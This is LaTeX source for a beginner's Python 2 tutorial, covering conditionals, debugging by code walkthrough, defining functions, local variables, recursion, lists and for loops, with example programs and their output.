So what does the computer do when when it sees this piece of code?  First it prompts the user for a number with the statement {\tt n = input(&quot;Number? &quot;)}.  Next it reads the line {\tt if n &lt; 0:} If {\tt n} is less than zero Python runs the line {\tt print &quot;The absolute value of&quot;,n,&quot;is&quot;,-n}. Otherwise python runs the line  {\tt  print &quot;The absolute value of&quot;,n,&quot;is&quot;,n}.  

More formally Python looks at whether the {\em expression} {\tt n &lt; 0} is true or false.  A {\tt if} statement is followed by a {\em block} of statements that are run when the expression is true.  Optionally after the {\tt if} statement is a {\tt else} statement.  The {\tt else} statement is run if the expression is false.  

There are several different tests that an expression can have.  Here is a table of all of them:

\begin{tabular}{l | l}
operator &amp; function \\
\hline 
\verb'&lt;' &amp; less than \\
\verb'&lt;=' &amp; less than or equal to \\
\verb'&gt;' &amp; greater than \\
\verb'&gt;=' &amp; greater than or equal to \\
\verb'==' &amp; equal \\
\verb'!=' &amp; not equal \\
\verb'&lt;&gt;' &amp;  another way to say not equal \\
\end{tabular}

Another feature of the {\tt if} command is the {\tt elif } statement.  It stands for else if and means if the original {\tt if} statement is false and then the {\tt elif} part is true do that part.  Here's an example:
\begin{verbatim}
a = 0
while a &lt; 10:
        a = a + 1
        if a &gt; 5:
                print a,&quot; &gt; &quot;,5
        elif a &lt;= 7:
                print a,&quot; &lt;= &quot;,7
        else:
                print &quot;Neither test was true&quot;
\end{verbatim}

and the output:

\begin{verbatim}
1  &lt;=  7
2  &lt;=  7
3  &lt;=  7
4  &lt;=  7
5  &lt;=  7
6  &gt;  5
7  &gt;  5
8  &gt;  5
9  &gt;  5
10  &gt;  5
\end{verbatim}

Notice how the {\tt elif a &lt;= 7} is only tested when the {\tt if} statement fail to be true.  {\tt elif} allows multiple tests to be done in a single if statement.

\chapter{Debugging}
\section{What is debugging?}
\begin{quotation}
As soon as we started programming, we found to our surprise that it
wasn't as easy to get programs right as we had thought.  Debugging had
to be discovered.  I can remember the exact instant when I realized
that a large part of my life from then on was going to be spent in
finding mistakes in my own programs.

-- Maurice Wilkes discovers debugging, 1949
\end{quotation}

By now if you have been messing around with the programs you have probably found that sometimes the program does something you didn't want it to do.  This is fairly common.  Debugging is the process of figuring out what the computer is doing and then getting it to do what you want it to do.  This can be tricky.  I once spent nearly a week tracking down and fixing a bug that was caused by someone putting an {\tt x} where a {\tt y} should have been.  

This chapter will be more abstract than previous chapters.  Please tell me if 
it is useful.

\section{What should the program do?}

The first thing to do (this sounds obvious) is to figure out what the
program should be doing if it is running correctly.  Come up with some
test cases and see what happens.  For example, let's say I have a
program to compute the perimeter of a rectangle (the sum of the length
of all the edges).  I have the following test cases:

\begin{tabular}{l | l | l}
width &amp; height &amp; perimeter\\
\hline
3 &amp; 4 &amp; 14\\
\hline
2 &amp; 3 &amp; 10\\
\hline
4 &amp; 4 &amp; 16\\
\hline
2 &amp; 2 &amp; 8\\
\hline 
5 &amp; 1 &amp; 12\\

\end{tabular}

I now run my program on all of the test cases and see if the program does what 
I expect it to do.  If it doesn't then I need to find out what the computer is
doing.  


More commonly some of the test cases will work and some will not.  If that is the case you should try and figure out what the working ones have in common. 
For example here is the output for a perimeter program (you get to see the code in a minute):

\begin{verbatim}
Height: 3
Width: 4
perimeter =  15
\end{verbatim}
\begin{verbatim}
Height: 2
Width: 3
perimeter =  11
\end{verbatim}
\begin{verbatim}
Height: 4
Width: 4
perimeter =  16
\end{verbatim}
\begin{verbatim}
Height: 2
Width: 2
perimeter =  8
\end{verbatim}
\begin{verbatim}
Height: 5
Width: 1
perimeter =  8
\end{verbatim}

Notice that it didn't work for the first two inputs, it worked for the next
two and it didn't work on the last one.  Try and figure out what is in common 
with the working ones.  Once you have some idea what the problem is finding the
cause is easier.  With your own programs you should try more test cases if you need them.

\section{What does the program do?}

The next thing to do is to look at the source code.  One of the most important things to do while programming is reading source code.  The primary way to do this is code walkthroughs.  

A code walkthrough starts at the first line, and works its way down until the program is done.  {\tt While} loops and {\tt if} statements mean that some lines may never be run and some lines are run many times.  At each line you figure out what Python has done.

Lets start with the simple perimeter program.  Don't type it in, you are going to read it, not run it.  The source code is:

\begin{verbatim}
height = input(&quot;Height: &quot;)
width = input(&quot;Width: &quot;)
print &quot;perimeter = &quot;,width+height+width+width
\end{verbatim}

\question What is the first line Python runs?

\answer The first line is alway run first.  In this case it is: \verb'height = input(&quot;Height: &quot;)'

\question What does that line do?

\answer Prints {\tt Height: }, waits for the user to type a number in, and puts that in the variable height.

\question What is the next line that runs?

\answer In general, it is the next line down which is: \verb'width = input(&quot;Width: &quot;)'

\question What does that line do?

\answer Prints {\tt Width: }, waits for the user to type a number in, and puts what the user types in the variable width.

\question What is the next line that runs?

\answer When the next line is not indented more or less than the current line,
 it is the line right afterwards, so it is: \verb'print &quot;perimeter = &quot;,width+height+width+width'  (It may also run a function in the current line, but thats a future chapter.)

\question What does that line do?

\answer First it prints {\tt perimeter =}, then it prints {\tt width+height+width+width}.

\question Does {\tt width+height+width+width} calculate the perimeter properly?

\answer Let's see, perimeter of a rectangle is the bottom (width) plus the left side (height) plus the top (width) plus the right side (huh?).  The last item should be the right side's length, or the height.

\question Do you understand why some of the times the perimeter was calculated `correctly'?

\answer It was calculated correctly when the width and the height were equal.

The next program we will do a code walkthrough for is a program that is supposed to print out 5 dots on the screen.  However, this is what the program is outputting:

\begin{verbatim}
. . . . 
\end{verbatim}

And here is the program:

\begin{verbatim}
number = 5
while number &gt; 1:
    print &quot;.&quot;,
    number = number - 1
print
\end{verbatim}

This program will be more complex to walkthrough since it now has indented portions (or control structures).  Let us begin.

\question What is the first line to be run?

\answer The first line of the file: {\tt number = 5}

\question What does it do?

\answer Puts the number 5 in the variable number.

\question What is the next line?

\answer The next line is: {\tt while number &gt; 1:}

\question What does it do?

\answer Well, {\tt while} statements in general look at their expression, and if it is true they do the next indented block of code, otherwise they skip the next indented block of code.

\question So what does it do right now?

\answer If {\tt number &gt; 1} is true then the next two lines will be run.

\question So is {\tt number &gt; 1}?

\answer The last value put into {\tt number} was {\tt 5} and {\tt 5 &gt; 1} so yes.

\question So what is the next line?

\answer Since the {\tt while} was true the next line is: \verb'print &quot;.&quot;,'

\question What does that line do?

\answer Prints one dot and since the statement ends with a {\tt ,} the next print statement will not be on a different screen line.

\question What is the next line?

\answer \verb'number = number - 1' since that is following line and there are no indent changes.

\question What does it do?

\answer It calculates {\tt number - 1}, which is the current value of
{\tt number} (or 5) subtracts 1 from it, and makes that the new value
of number.  So basically it changes {\tt number}'s value from 5 to 4.

\question What is the next line?

\answer Well, the indent level decreases so we have to look at what type of control structure it is.  It is a {\tt while} loop, so we have to go back to the {\tt while} clause which is \verb'while number &gt; 1:'

\question What does it do?

\answer It looks at the value of number, which is 4, and compares it to 1 and since \verb'4 &gt; 1' the while loop continues.

\question What is the next line?

\answer Since the while loop was true, the next line is: \verb'print &quot;.&quot;,'

\question What does it do?

\answer It prints a second dot on the line.

\question What is the next line?

\answer No indent change so it is: \verb'number = number - 1'

\question And what does it do?

\answer It talks the current value of number (4), subtracts 1 from it, which gives it 3 and then finally makes 3 the new value of number.

\question What is the next line?

\answer Since there is an indent change caused by the end of the while loop, the next line is: \verb'while number &gt; 1:'

\question What does it do?

\answer It compares the current value of number (3) to 1.  \verb'3 &gt; 1' so the while loop continues.

\question What is the next line?

\answer Since the while loop condition was true the next line is: \verb'print &quot;.&quot;,'

\question And it does what?

\answer A third dot is printed on the line.

\question What is the next line?

\answer It is: \verb'number = number - 1'

\question What does it do?

\answer It takes the current value of number (3) subtracts from it 1 and makes the 2 the new value of number.

\question What is the next line?

\answer Back up to the start of the while loop: \verb'while number &gt; 1:'

\question What does it do?

\answer It compares the current value of number (2) to 1.  Since \verb'2 &gt; 1' the while loop continues.

\question What is the next line?

\answer Since the while loop is continuing: \verb'print &quot;.&quot;,'

\question What does it do?

\answer It discovers the meaning of life, the universe and everything.  I'm joking. (I had to make sure you were awake.)  The line prints a fourth dot on the screen.

\question What is the next line?

\answer It's: \verb'number = number - 1'

\question What does it do?

\answer Takes the current value of number (2) subtracts 1 and makes 1 the new value of number.

\question What is the next line?

\answer Back up to the while loop: \verb'while number &gt; 1:'

\question What does the line do?

\answer It compares the current value of number (1) to 1.  Since \verb'1 &gt; 1' is false (one is not greater than one), the while loop exits.

\question What is the next line?

\answer Since the while loop condition was false the next line is the line after the while loop exits, or: \verb'print'

\question What does that line do?

\answer Makes the screen go to the next line.

\question Why doesn't the program print 5 dots?

\answer The loop exits 1 dot too soon.

\question How can we fix that?

\answer Make the loop exit 1 dot later.

\question And how do we do that?

\answer There are several ways.  One way would be to change the while loop to:
\verb'while number &gt; 0:'  Another way would be to change the conditional to: \verb'number &gt;= 1'  There are a couple others.

\section{How do I fix the program?}

You need to figure out what the program is doing.  You need to figure out what the program should do.  Figure out what the difference between the two is.  Debugging is a skill that has to be done to be learned. If you can't figure it out after an hour or so take a break, talk to someone about the problem or contemplate the lint in your navel.  Come back in a while and you will probably have new ideas about the problem.  Good luck.

\chapter{Defining Functions}
\section{Creating Functions}
To start off this chapter I am going to give you an example of what you could do but shouldn't (so don't type it in):
\begin{verbatim}
a = 23
b = -23

if a &lt; 0:
    a = -a

if b &lt; 0:
    b = -b

if a == b:
    print &quot;The absolute values of&quot;, a,&quot;and&quot;,b,&quot;are equal&quot;
else:
    print &quot;The absolute values of a and b are different&quot;
\end{verbatim}
with the output being:
\begin{verbatim}
The absolute values of 23 and 23 are equal
\end{verbatim}
The program seems a little repetitive.  (Programmers hate to repeat things (That's what computers are for aren't they?))  Fortunately Python allows you to create functions to remove duplication.  Here's the rewritten example:
\begin{verbatim}
a = 23
b = -23

def my_abs(num):
    if num &lt; 0:
        num = -num
    return num

if my_abs(a) == my_abs(b):
    print &quot;The absolute values of&quot;, a,&quot;and&quot;,b,&quot;are equal&quot;
else:
    print &quot;The absolute values of a and b are different&quot;
\end{verbatim}
with the output being:
\begin{verbatim}
The absolute values of 23 and -23 are equal
\end{verbatim}
The key feature of this program is the {\tt def} statement.  {\tt def}
(short for define) starts a function definition.  {\tt def} is
followed by the name of the function {\tt my_abs}.  Next comes a {\tt (}
followed by the parameter {\tt num} ({\tt num} is passed from the
program into the function when the function is called).  The statements
after the {\tt :} are executed when the function is used.  The
statements continue until either the indented statements end or a
{\tt return} is encountered.  The {\tt return} statement returns a value
back to the place where the function was called.

Notice how the values of {\tt a} and {\tt b} are not changed.
Functions of course can be used to repeat tasks that don't return
values.  Here's some examples:
\begin{verbatim}
def hello():
    print &quot;Hello&quot;

def area(width,height):
    return width*height

def print_welcome(name):
    print &quot;Welcome&quot;,name
    
hello()
hello()

print_welcome(&quot;Fred&quot;)
w = 4
h = 5
print &quot;width =&quot;,w,&quot;height =&quot;,h,&quot;area =&quot;,area(w,h)
\end{verbatim}
with output being:
\begin{verbatim}
Hello
Hello
Welcome Fred
width = 4 height = 5 area = 20
\end{verbatim}
That example just shows some more stuff that you can do with
functions.  Notice that you can use no arguments or two or more.
Notice also when a function doesn't need to send back a value, a
return is optional.

%Functions can be used to eliminate repeat code.

\section{Variables in functions}

Of course, when eliminiating repeated code, you often have variables in 
the repeated code.  These are dealt with in a special way in Python.  Up 
till now, all variables we have see are global variables.  Functions have 
a special type of variable called local variables.  These variables only 
exist while the function is running.  When a local variable has the 
same name as another variable such as a global variable, the local variable
hides the other variable.  Sound confusing?  Well, hopefully this next 
example (which is a bit contrived) will clear things up.

\begin{verbatim}
a_var = 10
b_var = 15
e_var = 25

def a_func(a_var):
    print &quot;in a_func a_var = &quot;,a_var
    b_var = 100 + a_var
    d_var = 2*a_var
    print &quot;in a_func b_var = &quot;,b_var
    print &quot;in a_func d_var = &quot;,d_var
    print &quot;in a_func e_var = &quot;,e_var
    return b_var + 10

c_var = a_func(b_var)

print &quot;a_var = &quot;,a_var
print &quot;b_var = &quot;,b_var
print &quot;c_var = &quot;,c_var
print &quot;d_var = &quot;,d_var
\end{verbatim}

The output is:
\begin{verbatim}

in a_func a_var =  15
in a_func b_var =  115
in a_func d_var =  30
in a_func e_var =  25
a_var =  10
b_var =  15
c_var =  125
d_var = 
Traceback (innermost last):
  File &quot;separate.py&quot;, line 20, in ?
    print &quot;d_var = &quot;,d_var
NameError: d_var
\end{verbatim}

In this example the variables {\tt a_var}, {\tt b_var}, and {\tt d_var}
are all local variables when they are inside the function {\tt a_func}.  
After the statement {\tt return b_var + 10} is run, they all cease to 
exist. The variable {\tt a_var} is automatically a local variable since it 
is a parameter name.  The variables {\tt b_var} and {\tt d_var} are local
variables since they appear on the left of an equals sign in the function in
the statements \verb'b_var = 100 + a_var' and \verb'd_var = 2*a_var' .

Inside of the function {\tt a_var} is 15 since the function is called
with {\tt a_func(b_var)}.  Since at that point in time {\tt b_var} is 
15, the call to the function is {\tt a_func(15)}  This ends up setting
{\tt a_var} to 15 when it is inside of {\tt a_func}.  

As you can see, once the function finishes running, the local variables
{\tt a_var} and {\tt b_var} that had hidden the global variables of the same
name are gone.  Then the statement \verb'print &quot;a_var = &quot;,a_var' prints the 
value {\tt 10} rather than the value {\tt 15} since the local variable 
that hid the global variable is gone.  

Another thing to notice is the {\tt NameError} that happens at the end.  
This appears since the variable {\tt d_var} no longer exists since 
{\tt a_func} finished.  All the local variables are deleted when the function
exits.  If you want to get something from a function, then you will have 
to use {\tt return something}.

One last thing to notice is that the value of {\tt e_var} remains unchanged 
inside {\tt a_func} since it is not a parameter and it never appears on the 
left of an equals sign inside of the function {\tt a_func}.  When a 
global variable is accessed inside a function it is the global variable 
from the outside.

Functions allow local variables that exist only inside the function and 
can hide other variables that are outside the function.

\section{Function walkthrough}

{\em TODO} Move this section to a new chapter, Advanced Functions.

Now we will do a walk through for the following program:
\begin{verbatim}
def mult(a,b):
    if b == 0:
        return 0
    rest = mult(a,b - 1)
    value = a + rest
    return value

print &quot;3*2 = &quot;,mult(3,2)
\end{verbatim}

Basically this program creates a positive integer multiplication function
(that is far slower than the built in multiplication function) and then
demonstrates this function with a use of the function.  

\question What is the first thing the program does?

\answer The first thing done is the function mult is defined with the lines:
\begin{verbatim}
def mult(a,b):
    if b == 0:
        return 0
    rest = mult(a,b - 1)
    value = a + rest
    return value
\end{verbatim}
This creates a function that takes two parameters and returns a value when 
it is done.  Later this function can be run.

\question What happens next?  

\answer The next line after the function,
\verb'print &quot;3*2 = &quot;,mult(3,2)' is run.

\question And what does this do?

\answer It prints \verb'3*2 = ' and the return value of \verb'mult(3,2)'

\question And what does \verb'mult(3,2)' return?

\answer We need to do a walkthrough of the {\tt mult} function to find out.

\question What happens next?

\answer The variable {\tt a} gets the value 3 assigned to it and the 
variable {\tt b} gets the value 2 assigned to it.

\question And then?

\answer The line \verb'if b == 0:' is run.  Since {\tt b} has the value 2 
this is false so the line \verb' return 0' is skipped.

\question And what then?

\answer The line \verb'rest = mult(a,b - 1)' is run.  This line sets the 
local variable {\tt rest} to the value of \verb'mult(a,b - 1)'.  The 
value of {\tt a} is 3 and the value of {\tt b} is 2 so the function call 
is \verb'mult(3,1)'

\question So what is the value of \verb'mult(3,1)' ?

\answer We will need to run the function {\tt mult} with the parameters
3 and 1.

\question So what happens next?

\answer The local variables in the {\em new} run of the function are
set so that {\tt a} has the value 3 and {\tt b} has the value 1.
Since these are local values these do not affect the previous values
of {\tt a} and {\tt b}.

\question And then?

\answer Since {\tt b} has the value 1 the if statement is false, so the 
next line becomes \verb'rest = mult(a,b - 1)'.

\question What does this line do?

\answer This line will assign the value of {\tt mult(3,0)} to rest.

\question So what is that value?

\answer We will have to run the function one more time to find that out.
This time {\tt a} has the value 3 and {\tt b} has the value 0.

\question So what happens next?

\answer The first line in the function to run is \verb'if b == 0:' .  {\tt b} has the value 0 so the next line to run is \verb'return 0' 

\question And what does the line \verb'return 0' do?

\answer This line returns the value 0 out of the function. 

\question So?

\answer So now we know that {\tt mult(3,0)} has the value 0.  Now we
know what the line \verb'rest = mult(a,b - 1)' did since we have run
the function {\tt mult} with the parameters 3 and 0.  We have finished
running {\tt mult(3,0)} and are now back to running {\tt mult(3,1)}.
The variable {\tt rest} gets assigned the value 0.

\question What line is run next?

\answer The line \verb'value = a + rest' is run next. In this run of the 
function, \verb'a=3' and \verb'rest=0' so now \verb'value=3'.  

\question What happens next?

\answer The line \verb'return value' is run.  This returns 3 from the function.
This also exits from the run of the function {\tt mult(3,1)}.  After {\tt return} is called, we go back to running {\tt mult(3,2)}.

\question Where were we in {\tt mult(3,2)}?

\answer We had the variables \verb'a=3' and \verb'b=2' and were examining 
the line \verb'rest = mult(a,b - 1)' .

\question So what happens now?

\answer The variable {\tt rest} get 3 assigned to it.  The next line
\verb'value = a + rest' sets {\tt value} to {\tt 3+3} or 6.  

\question So now what happens?

\answer The next line runs, this returns 6 from the function.  We are now
back to running the line \verb'print &quot;3*2 = &quot;,mult(3,2)' which can now
print out the 6.

\question What is happening overall?  

\answer Basically we used two facts to calulate the multipule of the
two numbers.  The first is that any number times 0 is 0 ({\tt x * 0 =
0}).  The second is that a number times another number is equal to the
first number plus the first number times one less than the second
number ({\tt x * y = x + x * (y - 1)}).  So what happens is {\tt 3*2} is
first converted into {\tt 3 + 3*1}.  Then {\tt 3*1} is converted into
{\tt 3 + 3*0}.  Then we know that any number times 0 is 0 so {\tt 3*0}
is 0.  Then we can calculate that {\tt 3 + 3*0} is {\tt 3 + 0} which
is {\tt 3}.  Now we know what {\tt 3*1} is so we can calculate that
{\tt 3 + 3*1} is {\tt 3 + 3} which is {\tt 6}.

This is how the whole thing works:

\begin{verbatim}
3*2
3 + 3*1
3 + 3 + 3*0
3 + 3 + 0
3 + 3
6
\end{verbatim}

These last two sections were recently written.  If you have any
comments, found any errors or think I need more/clearer explanations
please email.  I have been known in the past to make simple things
incomprehensible.  If the rest of the tutorial has made sense, but this
section didn't, it is probably my fault and I would like to know.
Thanks.

    print 'Must be a positive number'
    w = input('Width:  ')
h = input('Height: ')
while h &lt;= 0:
    print 'Must be a positive number'
    h = input('Height: ')
print 'Width =',w,' Height =',h,' so Area =',area(w,h)
\end{verbatim}

Sample Run:
\begin{verbatim}

Your Name: Josh
Hello!
Welcome, Josh

To find the area of a rectangle,
Enter the width and height below.

Width:  -4
Must be a positive number
Width:  4
Height: 3
Width = 4  Height = 3  so Area = 12
\end{verbatim}

\section{Exercises}

Rewrite the area.py program done in \ref{firstarea} to have a separate
function for the area of a square, the area of a rectangle, and the
area of a circle.  (3.14 * radius**2). This program should include a
menu interface.

\chapter{Lists}
\section{Variables with more than one value}
You have already seen ordinary variables that store a single value.  However other variable types can hold more than one value.  The simplest type is called a list.  Here is an example of a list being used:

\begin{verbatim}
which_one = input(&quot;What month (1-12)? &quot;)
months = ['January', 'February', 'March', 'April', 'May', 'June', 'July',\
        'August', 'September', 'October', 'November', 'December']
if 1 &lt;= which_one &lt;= 12:
        print &quot;The month is&quot;,months[which_one - 1]
\end{verbatim}
 
and a output example:
\begin{verbatim}
What month (1-12)? 3
The month is March
\end{verbatim}

In this example the {\tt months} is a list.  {\tt months} is defined with the lines {\tt months = ['January', 'February', 'March', 'April', 'May', 'June', 'July',\verb'\' 'August', 'September', 'October', 'November', 'December']}  (Note that a \verb'\' can be used to split a long line).  The \verb'[' and \verb']' start and end the list with comma's (``\verb',''') separating the list items.  The list is used in \verb'months[which_one - 1]'.  A list consists of items that are numbered starting at 0.  In other words if you wanted January you would use {\tt months[0]}.  Give a list a number and it will return the value that is stored at that location.  

The statement {\tt if 1 &lt;= which_one &lt;= 12:} will only be true if {\tt which_one} is between one and twelve inclusive (in other words it is what you would expect if you have seen that in algebra).

Lists can be thought of as a series of boxes. %Each box has a different value.
For example, the boxes created by  {\tt demolist = ['life',42, 'the universe', 6,'and',7]} would look like this:

\begin{tabular}{l | c | c | c | c | c | c |}
box number &amp; 0 &amp; 1 &amp; 2 &amp; 3 &amp; 4 &amp; 5 \\
\hline
demolist &amp; `life' &amp; 42 &amp; `the universe' &amp; 6 &amp; `and' &amp; 7\\
\hline
\end{tabular}

Each box is referenced by its number so the statement {\tt demolist[0]} would get {\tt 'life'}, {\tt demolist[1]} would get {\tt 42} and so on up to {\tt demolist[5]} getting {\tt 7}.

\section{More features of lists}
The next example is just to show a lot of other stuff lists can do (for once I don't expect you to type it in, but you should probably play around with lists until you are comfortable with them.).  Here goes:
\begin{verbatim}
demolist = ['life',42, 'the universe', 6,'and',7]
print 'demolist = ',demolist
demolist.append('everything')
print &quot;after 'everything' was appended demolist is now:&quot;
print demolist
print 'len(demolist) =', len(demolist)
print 'demolist.index(42) =',demolist.index(42)
print 'demolist[1] =', demolist[1]
#Next we will loop through the list
c = 0
while c &lt; len(demolist):
    print 'demolist[',c,']=',demolist[c]
    c = c + 1
del demolist[2]
print &quot;After 'the universe' was removed demolist is now:&quot;
print demolist
if 'life' in demolist:
    print &quot;'life' was found in demolist&quot;
else:
    print &quot;'life' was not found in demolist&quot;
if 'amoeba' in demolist:
    print &quot;'amoeba' was found in demolist&quot;
if 'amoeba' not in demolist:
    print &quot;'amoeba' was not found in demolist&quot;
demolist.sort()
print 'The sorted demolist is ',demolist
\end{verbatim}

The output is:
\begin{verbatim}
demolist =  ['life', 42, 'the universe', 6, 'and', 7]
after 'everything' was appended demolist is now:
['life', 42, 'the universe', 6, 'and', 7, 'everything']
len(demolist) = 7
demolist.index(42) = 1
demolist[1] = 42
demolist[ 0 ]= life
demolist[ 1 ]= 42
demolist[ 2 ]= the universe
demolist[ 3 ]= 6
demolist[ 4 ]= and
demolist[ 5 ]= 7
demolist[ 6 ]= everything
After 'the universe' was removed demolist is now:
['life', 42, 6, 'and', 7, 'everything']
'life' was found in demolist
'amoeba' was not found in demolist
The sorted demolist is  [6, 7, 42, 'and', 'everything', 'life']
\end{verbatim}

This example uses a whole bunch of new functions.  Notice that you can
just {\tt print} a whole list.  Next the {\tt append} function is used
to add a new item to the end of the list.  \verb'len' returns how many
items are in a list.  The valid indexes (as in numbers that can be
used inside of the []) of a list range from 0 to {\tt len - 1}. The
{\tt index} function tell where the first location of an item is
located in a list.  Notice how \verb'demolist.index(42)' returns 1 and
when \verb'demolist[1]' is run it returns 42.  The line
\verb'#Next we will loop through the list' is a just a reminder to the
programmer (also called a comment).  Python will ignore any lines that
start with a \verb'#'.  Next the lines:
\begin{verbatim}
c = 0
while c &lt; len(demolist):
    print 'demolist[',c,']=',demolist[c]
    c = c + 1
\end{verbatim} 
Create a variable {\tt c} which starts at 0 and is incremented until it reaches the last index of the list.  Meanwhile the {\tt print} statement prints out each element of the list.  

The \verb'del' command can be used to remove a given element in a list.  The next few lines use the {\tt in} operator to test if an element is in or is not in a list.  

The \verb'sort' function sorts the list.  This is useful if you need a
list in order from smallest number to largest or alphabetical.  Note
that this rearranges the list.

In summary for a list the following operations occur:

\begin{tabular}{l | l}
example &amp; explanation\\
\hline
{\tt list[2]} &amp; accesses the element at index 2\\
{\tt list[2] = 3} &amp; sets the element at index 2 to be 3\\
{\tt del list[2] } &amp; removes the element at index 2\\
{\tt len(list)} &amp; returns the length of list\\
{\tt &quot;value&quot; in list} &amp; is true if {\tt &quot;value&quot;} is an element in list\\
{\tt &quot;value&quot; not in list} &amp; is true if {\tt &quot;value&quot;} is not an element in list\\
{\tt list.sort()} &amp; sorts list\\
{\tt list.index(&quot;value&quot;)} &amp; returns the index of the first place that {\tt &quot;value&quot;} occurs\\
{\tt list.append(&quot;value&quot;)} &amp; adds an element {\tt &quot;value&quot;} at the end of the list\\
\end{tabular}


This next example uses these features in a more useful way:
\begin{verbatim}
menu_item = 0
list = []
while menu_item != 9:
        print &quot;--------------------&quot;
        print &quot;1. Print the list&quot;
        print &quot;2. Add a name to the list&quot;
        print &quot;3. Remove a name from the list&quot;
        print &quot;4. Change an item in the list&quot;
        print &quot;9. Quit&quot;
        menu_item = input(&quot;Pick an item from the menu: &quot;)
        if menu_item == 1:
                current = 0
                if len(list) &gt; 0:
                        while current &lt; len(list):
                                print current,&quot;. &quot;,list[current]
                                current = current + 1
                else:
                        print &quot;List is empty&quot;
        elif menu_item == 2:
                name = raw_input(&quot;Type in a name to add: &quot;)
                list.append(name)
        elif menu_item == 3:
                del_name = raw_input(&quot;What name would you like to remove: &quot;)
                if del_name in list:
                        item_number = list.index(del_name)
                        del list[item_number]
                        #The code above only removes the first occurance of
                        # the name.  The code below from Gerald removes all.
                        #while del_name in list:
                        #       item_number = list.index(del_name)
                        #       del list[item_number]
                else:
                        print del_name,&quot; was not found&quot;
        elif menu_item == 4:
                old_name = raw_input(&quot;What name would you like to change: &quot;)
                if old_name in list:
                        item_number = list.index(old_name)
                        new_name = raw_input(&quot;What is the new name: &quot;)
                        list[item_number] = new_name
                else:
                        print old_name,&quot; was not found&quot;
print &quot;Goodbye&quot;
\end{verbatim}

And here is part of the output:

\begin{verbatim}
--------------------
1. Print the list
2. Add a name to the list
3. Remove a name from the list
4. Change an item in the list
9. Quit

Pick an item from the menu: 2
Type in a name to add: Jack

Pick an item from the menu: 2
Type in a name to add: Jill

Pick an item from the menu: 1
0 .  Jack
1 .  Jill

Pick an item from the menu: 3
What name would you like to remove: Jack

Pick an item from the menu: 4
What name would you like to change: Jill
What is the new name: Jill Peters

Pick an item from the menu: 1
0 .  Jill Peters

Pick an item from the menu: 9
Goodbye
\end{verbatim}

That was a long program.  Let's take a look at the source code.   The line {\tt list = []} makes the variable {\tt list} a list with no items (or elements).  The next important line is \verb'while menu_item != 9:'.  This line starts a loop that allows the menu system for this program.  The next few lines display a menu and decide which part of the program to run.  

The section:
\begin{verbatim}
current = 0
if len(list) &gt; 0:
        while current &lt; len(list):
                print current,&quot;. &quot;,list[current]
                current = current + 1
else:
        print &quot;List is empty&quot;
\end{verbatim}
goes through the list and prints each name.  \verb'len(list_name)' tell how many items are in a list.  If {\tt len} returns \verb'0' then the list is empty.

Then a few lines later the statement {\tt list.append(name)} appears.  It uses the {\tt append} function to add a item to the end of the list.  Jump down another two lines and notice this section of code:
\begin{verbatim}
item_number = list.index(del_name)
del list[item_number]
\end{verbatim}
Here the {\tt index} function is used to find the index value that will be used later to remove the item.  \verb'del list[item_number]' is used to remove an element of the list.   

The next section
\begin{verbatim}
old_name = raw_input(&quot;What name would you like to change: &quot;)
if old_name in list:
        item_number = list.index(old_name)
        new_name = raw_input(&quot;What is the new name: &quot;)
        list[item_number] = new_name
else:
        print old_name,&quot; was not found&quot;
\end{verbatim}
uses {\tt index} to find the \verb'item_number' and then puts \verb'new_name' where the \verb'old_name' was.  

Congraduations, with lists under your belt, you now know enough of the language
that you could do any computations that a computer can do (this is technically known as Turing-Completness).  Of course, there are still many features that
are used to make your life easier.  %%%TODO. 

\section{Examples}

test.py
\begin{verbatim}
## This program runs a test of knowledge

true = 1
false = 0

# First get the test questions
# Later this will be modified to use file io.
def get_questions():
    # notice how the data is stored as a list of lists
    return [[&quot;What color is the daytime sky on a clear day?&quot;,&quot;blue&quot;],\
            [&quot;What is the answer to life, the universe and everything?&quot;,&quot;42&quot;],\
            [&quot;What is a three letter word for mouse trap?&quot;,&quot;cat&quot;]]
\end{verbatim}
\begin{verbatim}

# This will test a single question
# it takes a single question in
# it returns true if the user typed the correct answer, otherwise false
def check_question(question_and_answer):
    #extract the question and the answer from the list
    question = question_and_answer[0]
    answer = question_and_answer[1]
    # give the question to the user
    given_answer = raw_input(question)
    # compare the user's answer to the testers answer
    if answer == given_answer:
        print &quot;Correct&quot;
        return true
    else:
        print &quot;Incorrect, correct was:&quot;,answer
        return false
\end{verbatim}
\begin{verbatim}

# This will run through all the questions
def run_test(questions):
    if len(questions) == 0:
        print &quot;No questions were given.&quot;
        # the return exits the function
        return
    index = 0
    right = 0
    while index &lt; len(questions):
        #Check the question
        if check_question(questions[index]):
            right = right + 1
        #go to the next question
        index = index + 1
    #notice the order of the computation, first multiply, then divide
    print &quot;You got &quot;,right*100/len(questions),&quot;% right out of&quot;,len(questions)

#now lets run the questions
run_test(get_questions())
\end{verbatim}

Sample Output:
\begin{verbatim}
What color is the daytime sky on a clear day?green
Incorrect, correct was: blue
What is the answer to life, the universe and everything?42
Correct
What is a three letter word for mouse trap?cat
Correct
You got  66 % right out of 3
\end{verbatim}

\section{Exercises}

Expand the test.py program so it has menu giving the option of taking
the test, viewing the list of questions and answers, and an option to
Quit.  Also, add a new question to ask, &quot;What noise does a truly
advanced machine make?&quot; with the answer of &quot;ping&quot;.

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\chapter{For Loops}
And here is the new typing exercise for this chapter:
\begin{verbatim}
onetoten = range(1,11)
for count in onetoten:
        print count
\end{verbatim}
and the ever-present output:
\begin{verbatim}
1
2
3
4
5
6
7
8
9
10
\end{verbatim}
The output looks awfully familiar but the program code looks different.  The first line uses the {\tt range} function.  The {\tt range} function uses two arguments like this {\tt range(start,finish)}.  {\tt start} is the first number that is produced.  {\tt finish} is one larger than the last number.  Note that this program could have been done in a shorter way:
\begin{verbatim}
for count in range(1,11):
        print count
\end{verbatim}
Here are some examples to show what happens with the {\tt range} command:
\begin{verbatim}
&gt;&gt;&gt; range(1,10)
[1, 2, 3, 4, 5, 6, 7, 8, 9]
&gt;&gt;&gt; range(-32, -20)
[-32, -31, -30, -29, -28, -27, -26, -25, -24, -23, -22, -21]
&gt;&gt;&gt; range(5,21)
[5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
&gt;&gt;&gt; range(21,5)
[]
\end{verbatim}
